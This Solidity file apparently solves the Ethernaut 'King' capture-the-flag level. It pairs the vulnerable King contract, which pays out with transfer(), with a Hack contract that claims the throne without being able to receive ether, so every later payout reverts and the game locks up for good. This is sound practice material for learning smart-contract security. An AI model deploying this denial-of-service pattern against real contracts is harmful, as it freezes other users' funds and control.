// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    constructor(address payable _king) payable {
        (bool x,) =_king.call{value: msg.value}("");
        require(x, "Failure");
    }
}

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}